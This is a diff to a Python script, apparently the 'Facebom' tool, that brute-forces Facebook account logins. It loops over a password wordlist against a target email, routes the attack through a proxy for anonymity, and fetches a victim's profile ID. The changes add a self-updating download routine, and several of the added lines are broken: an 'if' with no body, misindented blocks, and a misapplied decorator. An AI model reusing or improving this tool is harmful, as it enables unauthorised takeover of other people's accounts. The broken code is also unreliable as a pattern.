@@ -1,12 +1,6 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-######################
-# SCRIPT : Facebom
-#    JOB : Brute Force Attack On Facebook Accounts
-#Codedby : Oseid Aldary
-######################
-
 import socket, sys, os, re, random, optparse, time
+if sys.version_info.major <= 2:import httplib
+else:import http.client as httplib
 
 ## COLORS ###############
 wi="\033[1;37m" #>>White#
@@ -16,18 +10,22 @@ yl="\033[1;33m" #>Yellow#
 #########################
 
 os.system("cls||clear")
-errMsg = lambda msg: rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi
 
+def write(text):
+    sys.stdout.write(text)
+    sys.stdout.flush()
+
+errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)
 
 try:import requests
 except ImportError:
-    print(errMsg("[ requests ] module is missing"))
+    errMsg("[ requests ] module is missing")
     print("  [*] Please Use: 'pip install requests' to install it :)")
     sys.exit(1)
 
 try:import mechanize
 except ImportError:
-    print(errMsg("[ mechanize ] module is missing"))
+    errMsg("[ mechanize ] module is missing")
     print("  [*] Please Use: 'pip install mechanize' to install it :)")
     sys.exit(1)
 
@@ -35,10 +33,11 @@ except ImportError:
 class FaceBoom(object):
 
 
-    def __init__(self, target=None, target_profile=None,singal_passwd=None, wordlist=None, proxy=None):
+    def __init__(self, target=None, target_profile=None,singal_passwd=None, wordlist=None, proxy=None, update=False):
 
         self.br = mechanize.Browser()
         self.br.set_handle_robots(False)
+        self.br._factory.is_html = True
         self.br.addheaders=[('User-agent',self.get_random_user_agent())]
         self.target = target
         self.target_profile = target_profile
@@ -46,27 +45,28 @@ class FaceBoom(object):
         self.wordlist = wordlist
         self.proxy = proxy
         self.useProxy = False
+        self.update = update
         if self.wordlist:
             if not os.path.isfile(self.wordlist):
-                print(errMsg("Please check Your Wordlist Path"))
+                errMsg("Please check Your Wordlist Path")
                 sys.exit(1)
         if not self.cnet():
-            print(errMsg("Please Check Your Internet Connection"))
+            errMsg("Please Check Your Internet Connection")
             sys.exit(1)
-            
         if self.proxy:
              print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(self.proxy if not ":" in self.proxy else self.proxy.split(":")[0]))
              if self.proxy.count(".") != 3:
-                    print(errMsg("Invalid IPv4 ["+rd+str(self.proxy)+yl+"]"))
+                    errMsg("Invalid IPv4 ["+rd+str(self.proxy)+yl+"]")
                     sys.exit(1)
              check = self.proxy+":8080" if not ":" in self.proxy else self.proxy
+             print("check", check)
              if self.check_proxy(check):
                 print(wi+"["+gr+"Connected"+wi+"]")
                 self.useProxy = check
                 self.br.set_proxies({'https':self.useProxy, 'http':self.useProxy})
              else:
-                print(errMsg("Connection Failed"))
-                print(errMsg("Invalid HTTPS Proxy["+rd+str(self.proxy)+yl+"]"))
+                errMsg("Connection Failed")
+                errMsg("Unable to connect to Proxy["+rd+str(self.proxy)+yl+"]")
                 sys.exit(1)
 
     get_random_user_agent = staticmethod(lambda: random.choice([
@@ -79,7 +79,8 @@ class FaceBoom(object):
                'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))
 
 
-    def check_proxy(self,proxy):
+    @staticmethod
+    def check_proxy(proxy):
           proxies = {'https':"https://"+proxy, 'http':"http://"+proxy}
           proxy_ip = proxy.split(":")[0]
           try:
@@ -87,7 +88,6 @@ class FaceBoom(object):
             if proxy_ip==r.headers['X-Client-IP']: return True
             return False
           except Exception : return False
-
 
     @staticmethod
     def cnet():
@@ -97,7 +97,7 @@ class FaceBoom(object):
         except socket.error:pass
         return False
 
-    @property
+    @staticmethod
     def get_profile_id(self):
         proxies = {} if not self.useProxy else {'https':self.useProxy, 'http':self.useProxy}
         try:
@@ -107,7 +107,7 @@ class FaceBoom(object):
             idis = idre.findall(con)
             print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis[0]+wi)
         except IndexError:
-            print(errMsg("Please Check Your Victim's Profile URL"))
+            errMsg("Please Check Your Victim's Profile URL")
             sys.exit(1)
 
     def login(self, password):
@@ -138,21 +138,44 @@ class FaceBoom(object):
 [~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
 ==================================\n"""+wi)
 
+
+    def updateFaceBoom(self):
+
+        write("[~] Checking for updates...\n")
+        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
+        conn.request("GET", "/Oseid/Facebom/master/core/version.txt")
+        repoVersion = conn.getresponse().read().strip().decode()
+        with open("core"+os.sep+"version.txt") as vf:
+            currentVersion = vf.read().strip()
+        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
+        else:
+            ask = input("  [?] An update has been found, do you want to update now?(Y:n)> ").strip()
+            while not ask:ask = input("    [!] please Answer with 'y' for yes or 'n' for no ?> ").strip()
+            if ask.lower() in ("yes","y"):
+                write("\n[~] Updating...please wait\n")
+                newCode = requests.get("https://raw.githubusercontent.com/Oseid/Facebom/master/facebom.py").text
+             with open("facebom.py", "wb") as  facebomScript:
+                   facebomScript.write(newCode)
+             with open("core"+os.sep+"version.txt", "w") as ver:
+                   ver.write(repoVersion)
+             write("  [+] Successfully updated :)\n")
+
+        else:write("\n[*] Ok Maybe later :)\n")
+
     def start(self):
+        if self.update:
         if self.target_profile:
-            self.get_profile_id
+            self.get_profile_id()
             sys.exit(1)
-            
         if self.target:
             self.banner()
             if self.singal_passwd:
                 passwd = self.singal_passwd.strip()
                 if len(passwd) <6:
-                    print(errMsg("Invalid Password"))
+                    errMsg("Invalid Password")
                     sys.exit(1)
                 try:
-                  sys.stdout.write(wi+"\n["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
-                  sys.stdout.flush()
+                  write(wi+"\n["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
                   if self.login(passwd):
                      sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                      print(wi+"========================="+"="*len(passwd)+"======")
@@ -175,8 +198,7 @@ class FaceBoom(object):
                     for passwd in wlist:
                         passwd = passwd.strip()
                         if not passwd or len(passwd) <6:continue
-                        sys.stdout.write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-                        sys.stdout.flush()
+                        write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                         try:
                           if self.login(passwd):
                              sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
@@ -213,6 +235,8 @@ OPTIONS:
     | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
     |--------
     | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
+    |--------
+    | -u/--update                             ::> Update FaceBom Script
 -------------
 Examples:
         |
@@ -229,7 +253,6 @@ Examples:
      |--------
 """)
 
-
 def Main():
    parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
       help="Specify Target Email ")
@@ -241,12 +264,14 @@ def Main():
                         help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
    parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                         help="Specify TARGET FACEBOOK PROFILE URL")
+   parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
    (options,args) = parse.parse_args()
-
+   if options.update:
+    FBOM = FaceBoom(update=True)
+    FBOM.start()
    if options.taremail !=None and options.wlst !=None and options.proxy !=None:
        FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst, proxy=options.proxy)
        FBOM.start()
-    
    elif options.taremail !=None and options.single !=None and options.proxy !=None:
        FBOM = FaceBoom(target=options.taremail, singal_passwd=options.single, proxy=options.proxy)
        FBOM.start()
@@ -268,7 +293,7 @@ def Main():
        exit(1)
 
 if __name__=='__main__':
-  Main()
+    Main()
 
 ##############################################################
 #####################                #########################
